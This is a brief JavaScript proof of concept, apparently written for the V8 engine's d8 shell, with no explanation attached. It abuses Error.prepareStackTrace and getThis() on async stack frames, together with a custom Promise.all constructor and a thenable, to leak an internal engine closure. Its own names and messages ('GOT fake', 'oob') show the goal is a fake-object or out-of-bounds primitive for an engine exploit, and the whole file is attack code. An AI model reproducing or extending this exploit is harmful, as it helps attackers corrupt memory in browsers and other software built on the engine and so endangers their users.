var oob_arr;
Error.prepareStackTrace = function (error, frames) {
  print('frames n=' + frames.length);
  if (frames.length >= 3) { oob_arr = frames[2].getThis(); print('GOT fake ' + typeof oob_arr); }
};
var closure;
function Constructor(executor) { executor(()=>{}, ()=>{}); }
Constructor.resolve = function(v) { return v; };
let p1 = { then(onFul, onRej) { closure = onFul; closure(1); } };
async function boo(x) { await bar(x).then(closure); }
async function bar(x) { await x; throw new Error("x"); }
async function foo() {
  await Promise.all.call(Constructor, [p1]);
  boo(1).catch(e => { e.stack; print('stack done, oob=' + (oob_arr !== undefined)); });
}
foo();
